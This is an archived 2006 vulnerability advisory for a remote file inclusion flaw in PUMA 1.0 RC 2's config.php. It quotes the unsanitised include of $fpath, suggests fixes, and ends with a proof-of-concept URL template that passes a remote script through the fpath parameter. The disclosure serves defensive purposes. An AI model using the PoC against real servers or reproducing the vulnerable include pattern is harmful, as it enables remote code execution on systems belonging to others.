<html><head><title>PUMA <= 1.0 RC 2 (config.php) Remote File Include Vulnerability</title></head><pre>+--------------------------------------------------------------------
+
+ PUMA 1.0 RC 2 (config.php) Remote File Inclusion
+
+ Original advisory:
+ http://www.bb-pcsecurity.de/Websecurity/415/org/PUMA_1.0_RC_2_(config.php)_R FI.htm
+
+--------------------------------------------------------------------
+
+ Affected Software .: PUMA 1.0 RC 2
+ Venedor ...........: http://php.psywerx.net/
+ Class .............: Remote File Inclusion
+ Risk ..............: high (Remote File Execution)
+ Found by ..........: Philipp Niedziela
+ Contact ...........: webmaster[at]bb-pcsecurity[.]de
+
+--------------------------------------------------------------------
+
+ Affected File:
+ /config.php
+
+ Code:
+ .....
+ // Select language
+ $lang = &quot;lang_english.php&quot;;
+ include($fpath.&quot;./language/$lang&quot;);
+ .....
+
+--------------------------------------------------------------------
+
+ $fpath is not properly sanitized before being used
+
+--------------------------------------------------------------------
+
+ Solution:
+  -&gt; Declare $fpath!
+  -&gt; Deny direct access to config.php
+  -&gt; or modify code:
+
+ if(!isset($_REQUEST['fpath']) &amp;&amp; !isset($_GET['fpath']) &amp;&amp;
!isset($_POST['fpath'])){
+ //code of org. config.php
+ }
+ else {
+ echo &quot;You cannot access this file directly.&quot;;
+ die();
+ }
+
+--------------------------------------------------------------------
+
+ PoC:
+
+ http://[target]/config.php?fpath=[script]
+
+--------------------------------------------------------------------
+
+ Greets and Thanks: /str0ke
+
+-------------------------[ E O F ]----------------------------------

# milw0rm.com [2006-09-10]</pre></html>